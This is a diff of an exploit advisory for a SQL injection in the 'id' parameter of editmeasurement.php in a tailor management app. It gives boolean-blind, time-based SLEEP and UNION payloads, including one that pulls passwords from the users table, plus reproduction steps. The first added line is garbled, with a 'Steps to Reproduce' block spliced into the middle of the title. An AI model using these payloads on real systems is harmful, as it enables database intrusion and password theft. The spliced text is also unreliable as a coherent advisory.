@@ -1,4 +1,12 @@
-# Exploit Title: Tailor MS – SQL Injection in editmeasurement.php (`http://localhost/tailor/editmeasurement.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in editmeasurement.ph## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/editmeasurement.php?id=1`.  
+2. Intercept the request and inject the following payload into the `id` parameter:
+    ```
+    http://localhost:8000/editmeasurement.php?id=1' UNION SELECT password, 2 from users-- -
+    ```
+3. Observe the extracted password displayed in the application (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.tp://localhost:8000/editmeasurement.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +28,31 @@ A SQL Injection vulnerability exists in the `editmeasurement.php` endpoint of **
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/editmeasurement.php?id=1`
+- **URL:** `http://localhost:8000/editmeasurement.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `editmeasurement.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
   - **Payload:** `id=1' AND 5775=(SELECT (CASE WHEN (5775=5775) THEN 5775 ELSE (SELECT 6801 UNION SELECT 8032) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)
   - **Payload:** `id=1' AND SLEEP(5)#`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (random number) - 2 columns
-  - **Payload:** 
-```
-id=-5561' UNION ALL SELECT CONCAT(0x716a706a71,0x554a497945436d72785a786b615345776d485065676f545043594b6b706956574b697447556c516b,0x716a6a6271),3285-- -
-```
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract password via UNION SELECT - 2 columns
+  - **Payload:**  
+    ```
+    http://localhost:8000/editmeasurement.php?id=1' UNION SELECT password, 2 from users-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +72,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/editmeasurement.php?id=1`.  
+1. Browse to `http://localhost:8000/editmeasurement.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `editmeasurement.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +82,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
